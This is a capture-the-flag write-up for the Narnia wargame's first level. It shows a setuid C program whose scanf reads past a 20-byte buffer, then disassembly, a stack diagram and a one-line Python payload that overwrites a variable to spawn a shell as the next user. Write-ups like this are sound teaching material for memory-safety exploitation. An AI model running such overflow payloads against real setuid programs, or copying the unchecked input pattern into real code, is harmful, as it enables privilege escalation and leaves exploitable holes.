### Level 0 to 1

We have:
``` C
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
   */
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
Program runs shell as ```narnia1``` user 
``` bash
narnia0@narnia:/narnia$ ls -la narnia0*
-r-sr-x--- 1 narnia1 narnia0 7456 Oct 29  2018 narnia0
-r--r----- 1 narnia0 narnia0 1229 Oct 29  2018 narnia0.c
```
if value in `val` is equal to `0xdeadbeef`.
Program also reads input to `buf` but does not check input length. Guess we can overwrite variable `val` since 
it will be before `buff` on the stack.

Some output with `objdump`
```bash
0804855b <main>:
 804855b:	55                   	push   ebp
 804855c:	89 e5                	mov    ebp,esp
 804855e:	53                   	push   ebx
 804855f:	83 ec 18             	sub    esp,0x18
 8048562:	c7 45 f8 41 41 41 41 	mov    DWORD PTR [ebp-0x8],0x41414141
```
We can see that `0x18` (24 in decimal) bytes are reserved for local variables (20 byte `buff` and 4 byte `val`)
Futher we can even see that our `val` is initialized: `mov    DWORD PTR [ebp-0x8],0x41414141`.


So this is how stack looks like:
```
<---- stack grows
----------------------------------------------
   ...|buff (20 bytes) | val (4 bytes) | ebx |
----------------------------------------------
-----> memory
```
If we overflow `buff` we overwrite `val`.

This is done with simple command:
```bash
(python -c "print('B'*20 + '\xef\xbe\xad\xde')";cat) | ./narnia0
```
Needed to add `cat` because linux exites on finished pipe.

